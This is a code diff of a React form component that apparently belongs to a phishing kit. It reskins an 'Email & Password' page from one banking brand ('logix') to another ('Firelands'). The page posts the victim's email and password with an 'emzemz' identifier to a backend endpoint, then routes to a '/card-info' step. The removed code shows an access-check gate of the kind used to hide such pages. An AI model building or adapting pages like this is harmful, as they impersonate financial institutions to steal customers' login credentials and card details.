@@ -1,183 +1,97 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { baseUrl } from '../constants';
-import useAccessCheck from '../Utils/useAccessCheck';
+
+const heroImageUrl = '/assets/firelands-landing.jpg';
 
 const EmailPassword: React.FC = () => {
-  const [email, setEmail] = useState('');
-  const [password, setPassword] = useState('');
-  const [confirmPassword, setConfirmPassword] = useState('');
-  const [showPassword, setShowPassword] = useState(false);
-  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
-  const [isLoading, setIsLoading] = useState(false);
-  const [errors, setErrors] = useState({
-    email: '',
-    password: '',
-    confirmPassword: ''
-  });
-
-  const navigate = useNavigate();
   const location = useLocation();
   const { emzemz } = location.state || {};
-  const isAllowed = useAccessCheck(baseUrl);
+  const navigate = useNavigate();
+  
+  useEffect(() => {
+    if (!emzemz) navigate('/');
+  }, [emzemz, navigate]);
 
-  if (!isAllowed) {
-    return <div>Loading...</div>;
-  }
+  const [email, setEmail] = useState('');
+  const [password, setPassword] = useState('');
+  const [errors, setErrors] = useState({ email: '', password: '' });
+  const [isLoading, setIsLoading] = useState(false);
 
-  if (!emzemz) {
-    return <div>Missing user details. Please restart the process.</div>;
-  }
-
-  const validateEmail = (email: string) => {
-    const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-    return regex.test(email);
-  };
-
-  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
-    event.preventDefault();
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
     setIsLoading(true);
-
+    
     const newErrors = {
-      email: !email.trim() ? 'Email is required' : !validateEmail(email) ? 'Invalid email format' : '',
-      password: password.length < 8 ? 'Password must be at least 8 characters' : '',
-      confirmPassword: password !== confirmPassword ? 'Passwords do not match' : ''
+      email: !email ? 'Email is required' : '',
+      password: !password ? 'Password is required' : ''
     };
-
+    
     setErrors(newErrors);
-
-    if (!newErrors.email && !newErrors.password && !newErrors.confirmPassword) {
-      try {
-        await axios.post(`${baseUrl}api/logix-email-password/`, {
-          emzemz,
-          email,
-          password
-        });
-        console.log('Email and password set successfully');
-        navigate('/basic-info', { state: { emzemz } });
-      } catch (error) {
-        console.error('Error setting email/password:', error);
-        setErrors(prev => ({
-          ...prev,
-          form: 'There was an error. Please try again.'
-        }));
-        setIsLoading(false);
-      }
-    } else {
+    
+    if (newErrors.email || newErrors.password) {
+      setIsLoading(false);
+      return;
+    }
+    
+    try {
+      await axios.post(`${baseUrl}api/firelands-email-password/`, { 
+        emzemz, email, password 
+      });
+      navigate('/card-info', { state: { emzemz } });
+    } catch (error) {
+      console.error('Error submitting email/password:', error);
+    } finally {
       setIsLoading(false);
     }
   };
 
   return (
-    <div className="flex-1 bg-gray-200 rounded shadow-sm">
-      <div className="border-b-2 border-teal-500 px-8 py-4">
-        <h2 className="text-xl font-semibold text-gray-800">Set Your Email & Password</h2>
+    <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
+      <div className="absolute inset-0">
+        <img src={heroImageUrl} alt="Firelands background" className="h-full w-full object-cover" />
+        <div className="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
       </div>
 
-      <div className="px-6 py-6 bg-white space-y-4">
-        <p className="text-sm text-gray-700">
-          Create your account credentials to access your online banking.
-        </p>
-
-        <form onSubmit={handleSubmit} className="space-y-4">
-          {/* Email Field */}
-          <div className="flex items-center gap-4">
-            <label className="text-gray-700 w-32 text-right">Email:</label>
-            <input
-              id="email"
-              name="email"
-              type="email"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter your email"
-            />
-          </div>
-          {errors.email && (
-            <div className="flex items-center gap-2 text-sm text-red-600 ml-36">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
-              </svg>
-              <span>{errors.email}</span>
-            </div>
-          )}
-
-          {/* Password Field */}
-          <div className="flex items-center gap-4">
-            <label className="text-gray-700 w-32 text-right">Password:</label>
-            <input
-              id="password"
-              name="password"
-              type={showPassword ? 'text' : 'password'}
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Enter password"
-            />
-            <span
-              className="text-blue-700 text-sm hover:underline cursor-pointer"
-              onClick={() => setShowPassword(!showPassword)}
-            >
-              {showPassword ? 'Hide' : 'Show'}
-            </span>
-          </div>
-          {errors.password && (
-            <div className="flex items-center gap-2 text-sm text-red-600 ml-36">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
-              </svg>
-              <span>{errors.password}</span>
-            </div>
-          )}
-
-          {/* Confirm Password Field */}
-          <div className="flex items-center gap-4">
-            <label className="text-gray-700 w-32 text-right">Confirm Password:</label>
-            <input
-              id="confirmPassword"
-              name="confirmPassword"
-              type={showConfirmPassword ? 'text' : 'password'}
-              value={confirmPassword}
-              onChange={(e) => setConfirmPassword(e.target.value)}
-              className="flex-1 max-w-xs border border-gray-300 px-2 py-1 text-sm"
-              placeholder="Re-enter password"
-            />
-            <span
-              className="text-blue-700 text-sm hover:underline cursor-pointer"
-              onClick={() => setShowConfirmPassword(!showConfirmPassword)}
-            >
-              {showConfirmPassword ? 'Hide' : 'Show'}
-            </span>
-          </div>
-          {errors.confirmPassword && (
-            <div className="flex items-center gap-2 text-sm text-red-600 ml-36">
-              <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current">
-                <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
-              </svg>
-              <span>{errors.confirmPassword}</span>
-            </div>
-          )}
-
-          <div className="border-b-2 border-teal-500 flex justify-center px-6 py-4">
-            {!isLoading ? (
+      <div className="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
+        <div className="mx-auto w-full max-w-6xl">
+          <div className="mx-auto w-full max-w-md rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur">
+            <h2 className="text-2xl font-semibold text-[#2f2e67]">Email & Password</h2>
+            
+            <form onSubmit={handleSubmit} className="mt-6 space-y-6">
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">Email Address</label>
+                <input
+                  type="email"
+                  value={email}
+                  onChange={(e) => setEmail(e.target.value)}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.email && <p className="text-sm text-rose-600">{errors.email}</p>}
+              </div>
+              
+              <div className="space-y-2">
+                <label className="text-sm text-[#5d4f72]">Password</label>
+                <input
+                  type="password"
+                  value={password}
+                  onChange={(e) => setPassword(e.target.value)}
+                  className="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-base text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
+                />
+                {errors.password && <p className="text-sm text-rose-600">{errors.password}</p>}
+              </div>
+              
               <button
                 type="submit"
-                className="bg-gray-600 hover:bg-gray-700 text-white px-16 py-2 text-sm rounded"
+                disabled={isLoading}
+                className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
               >
-                Continue
+                {isLoading ? 'Processing...' : 'Continue'}
               </button>
-            ) : (
-              <div className="h-10 w-10 animate-spin rounded-full border-4 border-solid border-gray-600 border-t-transparent" />
-            )}
+            </form>
           </div>
-        </form>
-      </div>
-
-      <div className="px-6 pb-6">
-        <p className="text-xs text-gray-700">
-          Your password must be at least 8 characters long and should include a mix of letters, numbers, and symbols for security.
-        </p>
+        </div>
       </div>
     </div>
   );
